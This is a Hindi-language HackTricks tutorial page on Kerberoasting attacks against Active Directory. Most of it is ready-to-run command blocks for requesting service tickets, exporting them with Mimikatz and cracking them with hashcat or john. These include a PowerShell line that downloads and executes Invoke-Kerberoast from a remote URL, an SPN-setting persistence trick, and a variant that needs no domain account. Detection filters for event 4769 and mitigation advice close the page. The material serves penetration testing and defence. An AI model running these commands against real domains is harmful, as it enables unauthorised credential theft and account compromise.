# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और **दुनिया के सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्मित और **स्वचालित** करें।\
आज ही पहुंचें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में **PRs सबमिट करके** अपने हैकिंग ट्रिक्स साझा करें।

</details>

## Kerberoast

Kerberoasting **TGS tickets** की प्राप्ति पर ध्यान केंद्रित है, विशेष रूप से उनके सेवाओं के लिए जो **Active Directory (AD)** में **उपयोगकर्ता खातों** के तहत कार्य कर रहे हैं, **कंप्यूटर खातों** को छोड़कर। इन टिकटों के एन्क्रिप्शन में उपयोगकर्ता पासवर्ड से उत्पन्न कुंजियों का उपयोग होता है, जिससे **ऑफलाइन प्रमाण पट्टी क्रैकिंग** की संभावना होती है। सेवा का उपयोग एक उपयोगकर्ता खाता द्वारा सूचित किया जाता है जिसका **"ServicePrincipalName"** गुणवत्ता खाली नहीं है।

**Kerberoasting** को निष्पादित करने के लिए, **TGS tickets** का अनुरोध करने की क्षमता वाला डोमेन खाता आवश्यक है; हालांकि, यह प्रक्रिया **विशेष अधिकार** की मांग नहीं करती, जिससे इसे किसी के पास **वैध डोमेन क्रेडेंशियल** के साथ पहुंचने में सहायक होता है।

### मुख्य बिंदु:

* **Kerberoasting** **AD** के भीतर **उपयोगकर्ता खात सेवाओं** के लिए **TGS tickets** को लक्ष्य बनाता है।
* **उपयोगकर्ता पासवर्ड** से उत्पन्न कुंजियों से एन्क्रिप्ट किए गए टिकट **ऑफलाइन** क्रैक किए जा सकते हैं।
* एक सेवा को एक ऐसा **ServicePrincipalName** द्वारा पहचाना जाता है जो खाली नहीं है।
* **कोई विशेष अधिकार** की आवश्यकता नहीं है, केवल **वैध डोमेन क्रेडेंशियल** की आवश्यकता है।

### **हमला**

{% hint style="warning" %}
**Kerberoasting tools** सामान्यत: **हमला करते समय** **`RC4 एन्क्रिप्शन`** का अनुरोध करते हैं और TGS-REQ अनुरोधों की शुरुआत करते हैं। इसलिए **RC4** [**कमजोर**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) है और इसे अन्य एन्क्रिप्शन एल्गोरिथ्मों जैसे AES-128 और AES-256 के मुकाबले ऑफलाइन में क्रैक करना आसान है।\
RC4 (प्रकार 23) हैश **`$krb5tgs$23$*`** से शुरू होते हैं जबकि AES-256 (प्रकार 18) **`$krb5tgs$18$*`** से शुरू होते हैं।
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
### Multi-फीचर उपकरण जिसमें kerberoastable उपयोगकर्ताओं का डंप शामिल है:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **केर्बेरोस्ट करने योग्य उपयोगकर्ताओं का जांच करें**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **तकनीक 1: TGS के लिए अनुरोध करें और यह मेमोरी से डंप करें**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **तकनीक 2: स्वचालित उपकरण**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
जब एक TGS का अनुरोध किया जाता है, तो Windows घटना `4769 - एक केरबेरोस सेवा टिकट का अनुरोध किया गया था` उत्पन्न होती है।
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और आसानी से **वर्ल्ड के सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **कार्यप्रवाह** बनाएं और स्वचालित करें।\
आज ही पहुंचें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### क्रैकिंग
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### स्थिरता

यदि आपके पास एक उपयोगकर्ता पर **पर्याप्त अनुमतियाँ** हैं तो आप इसे **केर्बेरोस्टेबल** बना सकते हैं:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
आप **kerberoast** हमलों के लिए उपयोगी **उपकरण** यहाँ पा सकते हैं: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

यदि आपको लिनक्स से यह **त्रुटि** मिलती है: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** तो यह आपके स्थानीय समय की वजह से है, आपको होस्ट को डीसी के साथ समक्रमित करने की आवश्यकता है। कुछ विकल्प हैं:

* `ntpdate <DC का IP>` - Ubuntu 16.04 के रूप में पुराना हो गया है
* `rdate -n <DC का IP>`

### संरोधन

करबेरोस्टिंग एक उच्च स्तर पर गुप्तता के साथ की जा सकती है अगर यह शोषणीय है। इस गतिविधि का पता लगाने के लिए, ध्यान दिया जाना चाहिए **सुरक्षा घटना आईडी 4769** पर, जो इसका संकेत देता है कि एक करबेरोस टिकट का अनुरोध किया गया है। हालांकि, इस घटना की उच्च आवृत्ति के कारण, संदेहपूर्ण गतिविधियों को अलग करने के लिए विशेष फिल्टर लागू किए जाने चाहिए:

* सेवा का नाम **krbtgt** नहीं होना चाहिए, क्योंकि यह एक सामान्य अनुरोध है।
* सेवा के नाम में **$** समाप्त होने चाहिए ताकि सेवाओं के लिए उपयुक्त मशीन खातों को शामिल न किया जाए।
* मशीनों से अनुरोधों को फ़िल्टर करना चाहिए, जिसमें खाता नाम को **machine@domain** के रूप में स्वरूपित किया गया हो।
* केवल सफल टिकट अनुरोध को विचार में लेना चाहिए, जिसे **'0x0'** विफलता कोड द्वारा पहचाना जाता है।
* **सबसे महत्वपूर्ण**, टिकट एन्क्रिप्शन प्रकार **0x17** होना चाहिए, जो अक्सर करबेरोस्टिंग हमलों में उपयोग किया जाता है।
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
खतरे को कम करने के लिए Kerberoasting का जोखिम कम करने के लिए:

* सुनिश्चित करें कि **सेवा खाता पासवर्ड कठिन हो** और **25 अक्षर** से अधिक होने की सिफारिश करें।
* **प्रबंधित सेवा खाते** का उपयोग करें, जो **स्वचालित पासवर्ड परिवर्तन** और **ध्यानाकर्षण सेवा प्रिंसिपल नाम (SPN) प्रबंधन** जैसे लाभ प्रदान करते हैं, जो इस तरह के हमलों के खिलाफ सुरक्षा को बढ़ावा देते हैं।

इन उपायों को लागू करके संगठन Kerberoasting के साथ जुड़े जोखिम को काफी कम कर सकते हैं।

## डोमेन खाता के बिना Kerberoast

**सितंबर 2022** में, एक नए तरीके से एक सिस्टम का शोध करने का एक नया तरीका एक शोधकर्ता नामक चार्ली क्लार्क द्वारा साझा किया गया था, जिसे उन्होंने अपने प्लेटफ़ॉर्म [exploit.ph](https://exploit.ph/) के माध्यम से साझा किया था। इस विधि की मदद से **सेवा टिकट्स (ST)** की प्राप्ति की जा सकती है एक **KRB\_AS\_REQ** अनुरोध के माध्यम से, जो वास्तव में किसी भी सक्रिय निर्देशिका खाते पर नियंत्रण की आवश्यकता नहीं है। मूल रूप से, यदि एक प्रमुख इस तरह से सेट किया गया है कि इसे पूर्व-प्रमाणीकरण की आवश्यकता नहीं है - एक स्थिति जो साइबर सुरक्षा विश्व में एक **AS-REP Roasting हमले** के रूप में जाना जाता है - तो इस विशेषता का उपयोग अनुरोध प्रक्रिया को ठगने के लिए किया जा सकता है। विशेष रूप से, अनुरोध के शरीर में **sname** विशेषता को बदलकर, सिस्टम को एक **ST** जारी करने के लिए धोखा दिया जाता है बजाय मानक एन्क्रिप्टेड टिकट ग्रांटिंग टिकट (TGT)।

इस तकनीक को पूरी तरह से इस लेख में समझाया गया है: [Semperis ब्लॉग पोस्ट](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
आपको उपयोगकर्ताओं की सूची प्रदान करनी चाहिए क्योंकि हमारे पास इस तकनीक का उपयोग करके LDAP क्वेरी करने के लिए कोई वैध खाता नहीं है।
{% endhint %}

#### लिनक्स

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## संदर्भ

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, **The PEASS Family** की खोज करें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) से या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को।

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **वर्कफ़्लो** बनाएं और **स्वत: कार्यक्रमित** करें जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित है।\
आज ही पहुंचें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
